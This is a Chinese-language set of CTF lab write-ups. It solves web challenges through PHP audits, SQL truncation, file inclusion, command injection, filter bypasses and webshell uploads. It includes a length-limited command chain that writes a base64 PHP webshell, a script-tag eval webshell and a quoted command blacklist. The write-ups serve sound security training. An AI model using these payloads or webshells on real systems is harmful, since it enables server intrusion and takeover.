# 云演Web题库

`更新时间 2024-5-12`

---

# 矛盾

`https://www.yunyansec.com/#/experiment/ctfdetail/5`

考点：PHP代码审计，is_numeric()，弱比较

- 进入网页，直接看到PHP代码

> <img src="./IMG/Screenshot 2024-04-16 183916.png">

- 进行代码审计

```php
<?php
//以GET方式获取一个参数num，赋值为变量num
$num=$_GET['num'];
//如果num不是一个数字或数字字符串，进入if
if(!is_numeric($num))
{
echo $num;
//如果num等于1，进入if
if($num==1)
//得到flag
echo 'flag{**********}';
}
?>
```

- 构建payload

根据审计结果，我们需要通过GET方式传入一个参数num，这里使用url传参。然后是num的取值，既要num等于1，又要求num不能为数字，可以利用PHP弱比较的特性，当字符串与数字进行比较时，字符串会强制转换为int类型，如果数字在字符前面，则数字后面的字符全部清空，因此payload为 `?num=1a`

> <img src="./IMG/Screenshot 2024-04-16 192850.png">

# 单身一百年也没用

`https://www.yunyansec.com/#/experiment/ctfdetail/6`

考点：解码，base64

- 进入网页，有一个超链接，点击后无任何有效信息，但是仔细观察，发现存在中间页面

> <img src="./IMG/Screenshot 2024-04-16 194048.png">

- 打开BurpSuite，抓包，查看请求头，没有任何信息，发送到Repeater中，在响应头中发现了Key

> <img src="./IMG/Screenshot 2024-04-16 200630.png">

- 一眼看出是base64编码，解码得到flag

> <img src="./IMG/Screenshot 2024-04-16 200730.png">

# 单身20年的手速

`https://www.yunyansec.com/#/experiment/ctfdetail/7`

考点：抓包

- 进入网页，有个超链接，点击后无任何有效信息，同样存在中间页

> <img src="./IMG/Screenshot 2024-04-16 194048.png">

- 抓包，发送到Repeater中，在响应体中发现了flag

> <img src="./IMG/Screenshot 2024-04-21 183821.png">

# ereg

`https://www.yunyansec.com/#/experiment/ctfdetail/10`

考点：PHP代码审计，ereg()

- 进入网页，啥也没有，查看网页源代码，同样啥也没有，在url栏输入/robots.txt，跳出了一段php代码，猜测应该是主页源代码，下面开始代码审计

```php
//存在以GET方式传入的参数password
if (isset ($_GET['password'])) {
        //password参数包含了a-z，A-Z和0-9以外的字符
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
	{
		echo '<p>Your password must be alphanumeric</p>';
	
    }     //password参数的长度小于8，并且大于9999999
	  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
	{    
                //password中存在*-*
		if (strpos ($_GET['password'], '*-*') !== FALSE)
		{   //返回flag
			die('Flag: ' . $flag);
		}
		else
		{
			echo('<p>*-* have not been found</p>');
		}
	}
	else
	{
		echo '<p>Invalid password</p>';
	}
}
```

- 根据代码审计的结果，需要构建一个以GET方式传入的参数password，这里使用url传参，该参数需要大于9999999，长度小于8，则使用科学计数法1e8，同时在不允许使用特殊字符的情况下需要包含*-*，使用%00绕过，最终得到payload为 `1e8%00*-*`

> <img src="./IMG/Screenshot 2024-04-21 192230.png">

# intval

`https://www.yunyansec.com/#/experiment/ctfdetail/13`

考点：PHP代码审计

- 直接开始代码审计

```php
<?php
//不存在以GET形式传递的参数source
if(!isset($_GET['source'])){
    highlight_file('index.php');
    die();
}
include('flag.php');
//用4个变量接收了四个以GET方式传递的参数f，l，a，g
$key1 = $_GET['f'];
$key2 = $_GET['l'];
$key3 = $_GET['a'];
$key4 = $_GET['g'];
//参数f，l，a，g均存在
if(isset($key1)&&isset($key2)&&isset($key3)&&isset($key4))
{   //f的值大于1或者小于0
    if(intval($key1) > 1 || intval($key1) < 0)
        die("key1 is error.");
    //intval(f)的值小于1
    elseif(intval(intval($key1)) < 1)
    {   //f的值等于1
        if($key1 == 1){
            //l的值小于1
            if($key2 < 1){
                die("key2 is error.");
            //l的值大于等于1
            }else{
                //f + l大于1
                if(intval($key2 + $key1) > 1){
                    die("key is error.");
                //f + l小于等于1
                }else{
                    //赋值运算符优先级大于and
                    $check = is_numeric($key3) and is_numeric($key4);
                    //a的值不是数字
                    if(!$check){
                        die("key3 or key4 is error.");
                    //g不能为数字
                    }elseif(!(is_numeric($key3) and is_numeric($key4))){
                        $key3 = $flag;
                        $key4 = $redpacket;
                    }
                    die("flag:".$key3."<br>"."支付宝红包口令".$key4);
                }
            }
        }
        else
            die("key1 is error.");
    }
    else
        die("key1 is error.");
}
?>
```

- 根据代码审计结果，需要通过GET方式传入5个参数，这里使用url传参，传入的参数为source, f, l, a, g，source的取值任意，intval(f)小于1，f等于1，则f为0x1，l加上f需要小于等于1，且l需要大于等于1，则l取值为PHP中int的最大值9223372036854775807，加上1得到int最小值，a的值必须为数字，随便取值即可，g的值不能为数字，留空即可，因此最终得到的payload为 `source=&f=0x1&l=9223372036854775807&a=1&g=`

> <img src="./IMG/Screenshot 2024-04-21 200356.png">

# Blog

`https://www.yunyansec.com/#/experiment/ctfdetail/34`

考点：PHP代码审计

- 进入网页，是一个登录页面，尝试一些弱密码均无效，查看源代码

> <img src="./IMG/Screenshot 2024-04-25 163816.png">

- 进入对应url，发现超链接，点击进入，再打开源代码，发现txt文件

> <img src="./IMG/Screenshot 2024-04-25 164102.png">

- 进入txt文件，出现几行PHP代码，猜测是login.php的代码，开始代码审计

```php
<?php
session_start();
$_SESSION['pwd']=time();
//遍历$_REQUEST数组中的下标，取别名为v
foreach(array_keys($_REQUEST) as $v){
        //将v的值，也就是_REQUEST中的某一个下标赋值给key
        $key = $v;
        //将下标名定义为一个变量，储存的值为_REQUEST数组中下表明对应的值
        //举例：$_REQUEST['sub'] = 1
        //      $key = 'sub'
        //      $sub = 1
        $$key = $_REQUEST[$v];
    }
//存在$_POST['password']
if (isset ($_POST['password'])) {
    //需要$_SESSION['pwd'] == $pwd
    if ($_SESSION['pwd'] == $pwd)
        die('Flag:'.$flag);
    else{
        print '<p>猜测错误.</p>';
        $_SESSION['pwd']=time().time();
    }
}
```

- 这道题需要逆向思维，我们需要构建\$_SESSION['pwd'] == \$pwd，由上文可知，任何\$_REQUEST中的下标，都会创建一个对应的变量，变量的值与\$_REQUEST中的值相同，因此payload为 `_SESSION['pwd']=1&pwd=1&password=`

> <img src="./IMG/Screenshot 2024-04-25 170437.png">

# 后台管理系统

`https://www.yunyansec.com/#/experiment/ctfdetail/36`

考点：SQL约束攻击

- 打开网页，出现一个登录页面，点击注册，用户名admin，密码Abc123456，提示用户已存在

> <img src="./IMG/Screenshot 2024-04-25 171034.png">

- 将用户名改为 admin$~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$(很多空格)，密码输入Abc123456，提示注册成功

> <img src="./IMG/Screenshot 2024-04-25 171515.png">

- 登录得到flag

> <img src="./IMG/Screenshot 2024-04-25 171606.png">

# php_for_fun

`https://www.yunyansec.com/#/experiment/ctfdetail/37`

考点：PHP代码审计

- 打开网页，只显示了have a fun!!，查看源代码，也只有have a fun!!，查看响应头，发现了26966dc52e85af40f59b4fe73d8c323a.txt

> <img src="./IMG/Screenshot 2024-04-25 172251.png">

- 查看txt文件，删除乱码注释，开始代码审计

```php
<?php
 
$info = ""; 
$req = [];
$flag="SSCTF{areyoukiddingmeï¼Ÿ}";

ini_set("display_error", false);
error_reporting(0);
//存在$_GET['number']
if(!isset($_GET['number'])){
   header("hint:26966dc52e85af40f59b4fe73d8c323a.txt");
 
   die("have a fun!!");
 
}
//遍历[$_GET, $_POST]，取别名为$global_var
foreach([$_GET, $_POST] as $global_var) {
    //遍历$global_var，下标为$key，值为$value
    foreach($global_var as $key => $value) { 
        //移除value两边的空格
        $value = trim($value);
        //value为字符串，然后将value中的双引号前添加反斜杠，并赋值给$req[$key]
        is_string($value) && $req[$key] = addslashes($value);
    }
}
function is_palindrome_number($number) { 
    $number = strval($number);
    $i = 0; 
    $j = strlen($number) - 1;
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 
//$_REQUEST['number']需要是一个字符串
if(is_numeric($_REQUEST['number']))
{

   $info="sorry, you cann't input a number!";
 
}
//将$req['number']转换为int，再转换为string后依然等于$req['number']
elseif($req['number']!=strval(intval($req['number'])))
{

    header("hint2:a58658b92c386d17848bfab096d9e634.txt");
     $info = "number must be equal to it's integer!! ";  
 
}
else
{
    //$value1是$req['number']的int值
     $value1 = intval($req["number"]);
    //$value2是$req['number']的int值的反转值
     $value2 = intval(strrev($req["number"]));  
    //req['number']的int值是一个回文数字
     if($value1!=$value2){
         header("hint3:cb42920bc738a35318e3109fc5b51dc6.txt");
          $info="no, this is not a palindrome number!";
     }
     else
     {
        //$req['number']本身不能为回文字符串
          if(is_palindrome_number($req["number"])){
            header("hint4:07a9fe2942fe2e1e1db77aaa525e51d0.txt");
              $info = "nice! {$value1} is a palindrome number!"; 
          }
          else
          {
             $info=$flag;
          }
     }
 
}
 
echo $info;
```

- 根据审计结果，需要通过GET方式传入一个参数number，该参数不能为字符串，但是后续需要转换为int，不能实际使用字符串，代码使用 `is_numeric()` 函数判断，使用 `%00` 绕过，接着，参数的int值需要是回文，而本身不能为回文，则考虑在数字前添加特殊字符，考虑到参数会经过一层 `trim()` 函数，则需要一个既能绕过 `trim()` ，在转换为int后又会消失的特殊字符，使用 `%0c` 分页符，最后得到的payload为 `%00%0c1`

> <img src="./IMG/Screenshot 2024-04-28 185832.png">

# php4fun

`https://www.yunyansec.com/#/experiment/ctfdetail/38`

考点：文件包含

- 打开网页，进入index.bak

> <img src="./IMG/Screenshot 2024-04-28 190517.png">

- 写得是一言难尽，大概是将file:///、php://、data://之类的过滤了，仔细观察，发现file://没有被过滤，则payload为 `file://localhost/flag`

> <img src="./IMG/Screenshot 2024-04-28 190903.png">

# 这里有几首歌

`https://www.yunyansec.com/#/experiment/ctfdetail/39`

考点：base64

- 进入网页，有两个下载链接，疑似base64编码，对其一解码后得到choubaguai.mp3

> <img src="./IMG/Screenshot 2024-04-28 191827.png">

> <img src="./IMG/Screenshot 2024-04-28 191838.png">

- 对index.php和download.php进行编码，并传入下载url，download.php下载成功

```php
<?php
error_reporting(0);
include("hereiskey.php");
$url=base64_decode($_GET[url]);
if( $url=="hereiskey.php" || $url=="choubaguai.mp3" || $url=="One Love.mp3" || $url=="download.php"){
	$file_size = filesize($url);
	header ( "Pragma: public" );
	header ( "Cache-Control: must-revalidate, post-check=0, pre-check=0" );
	header ( "Cache-Control: private", false );
	header ( "Content-Transfer-Encoding: binary" );
	header ( "Content-Type:audio/mpeg MP3");
	header ( "Content-Length: " . $file_size);
	header ( "Content-Disposition: attachment; filename=".$url);
	echo(file_get_contents($url));
	exit;
}
else {
	echo "Access Forbidden!";
}
?>
```

- 在代码中发现hereiskey.php，对其编码并下载，得到flag

> <img src="./IMG/Screenshot 2024-04-28 192328.png">

# getshell

`https://www.yunyansec.com/#/experiment/ctfdetail/40`

考点：代码审计

- 进入网页，直接开始代码审计

```php
<?php
show_source(__FILE__);
error_reporting(0);
//存在参数1，字符串长度小于8
if(strlen($_GET[1])<8){
    //以shell执行参数内容
     echo shell_exec($_GET[1]);
}
?>
```

- 构建一句话木马，首先将一句话木马的代码准备好

```php
<?php echo shell_exec($_GET[1]);
```

- 使用base64编码，并构建生成代码

```shell
echo PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWzFdKTs=|base64 -d>a.php
```

- 构建payload，使用 `\` 标记特定字符，然后按指定行分隔，每行行头添加 `>` ，行尾添加 `\\` ，排列顺序是从下到上

```shell
>p
>a.ph\\
>-d\>\\
>64\ \\
>base\\
>s=\|\\
>FdKT\\
>VUWz\\
>RfR0\\
>VjKC\\
>9leG\\
>VsbF\\
>BzaG\\
>Noby\\
>AgZW\\
>9waH\\
>\ PD\\
>echo\\
```

- 在url栏使用参数1依次传入每行的值，然后使用 `ls -t>0` 来将内容传入0文件，使用 `sh 0` 执行0文件，发现生成a.php

> <img src="./IMG/Screenshot 2024-04-30 123144.png">

访问a.php，现在就能在a.php使用参数1传入任意值，绕过了长度限制

> <img src="./IMG/Screenshot 2024-04-30 123347.png">

# Can you getshell?

`https://www.yunyansec.com/#/experiment/ctfdetail/41`

考点：文件上传，文件包含，一句话木马

- 查看网页源代码，发现upload.php

> <img src="./IMG/Screenshot 2024-05-07 183220.png">

- 进入upload.php，提示上传图片文件，尝试上传php文件，提示上传失败，则上传图片马，上传成功，访问图片马，发现图片马中 `<?php` 和 `?>` 被屏蔽

> <img src="./IMG/Screenshot 2024-05-07 184242.png">

- 换一种马，使用蚁剑连接成功，取得flag

```js
<script language="php">@eval_r($_POST[admin])</script> 
```

> <img src="./IMG/Screenshot 2024-05-07 185354.png">

# exec

`https://www.yunyansec.com/#/experiment/ctfdetail/42`

考点：Linux，构造传参，命令执行

- 进入页面，显示the post Parameter is ip，则需要构建一个表单，以POST形式传递一个参数ip到该页面

```html
<form action="http://3a78c361.clsadp.com/" method="POST">
    <input name="ip" value="">
    <input type="submit" value="submit">
</form>
```

- 输入127.0.0.1提交，发现是ping

> <img src="./IMG/Screenshot 2024-05-07 191026.png">

- 使用管道符 `|` 查看根目录，在根目录发现flag文件

> <img src="./IMG/Screenshot 2024-05-07 191207.png">

使用 `cat /flag` 获取到flag

> <img src="./IMG/Screenshot 2024-05-07 191304.png">

# ping

`https://www.yunyansec.com/#/experiment/ctfdetail/45`

考点：Linux，命令执行

- 和上一题一样，但是使用GET传值，也就不需要构建网页了，但是该题屏蔽了`;` , `|` , `&` , `||` , `&&` ，只能使用 `%0a`

> <img src="./IMG/Screenshot 2024-05-07 192921.png">

- 进入 `http://ae072d2f.clsadp.com/fL4g_1s_He4r_______` 得到flag

> <img src="./IMG/Screenshot 2024-05-07 193023.png">

# RCE ME

`https://www.yunyansec.com/#/experiment/ctfdetail/102`

考点：命令执行，PHP代码审计

- 进入网页，显示This is the command practice，经过测试后发现屏蔽了很多关键字，尝试 `more index.php` 成功，并在网页源代码看到index.php的源码

> <img src="./IMG/Screenshot 2024-05-08 183854.png">

- 开始代码审计

```php
<?php
$cmd=$_POST['cmd'];
$blacklist="cat|\/|cd|flag|curl|{|\(|'|\"|echo|\\\\|&|grep|base64";
$arr=explode('|',$blacklist);
foreach ($arr as $key => $value) {
    if (preg_match("/$value/i", $cmd)) {
        exit('hacker~~~'); 
}
}
system($cmd);
?>
```

- 从代码可以看出，网页设置了一系列黑名单，并使用 `preg_match()` 函数判断传入的参数是否包含黑名单，仔细观察，占位符 `*` 没有被屏蔽，因此payload为 `more fl*g.php`

# php黑魔法

`https://www.yunyansec.com/#/experiment/ctfdetail/113`

考点：PHP代码审计，ord()函数

- 进入页面，开始代码审计

```php
<?php
highlight_file('2.php');
function noother_says_correct($number)
{
    $one = ord('1');
    $nine = ord('9');
    for ($i = 0; $i < strlen($number); $i++)
    {
        $digit = ord($number{$i});
        if ( ($digit >= $one) && ($digit <= $nine) )
        {
            return false;
        }
    }
    return $number == '54975581388';
}

$flag='{**********}';
if(noother_says_correct($_GET['key']))
    echo "flag is ".$flag;
else
    echo 'access denied';
?>
```

- 这个程序是将输入的值逐个转换为ascii码，与1-9的ascii码进行比较，不能出现1-9，又要等于54975581388，解决方法即是将54975581388转换为16进制，转换为16进制后得到ccccccccc，刚好没有出现数字0-9

> <img src="./IMG/Screenshot 2024-05-08 194048.png">

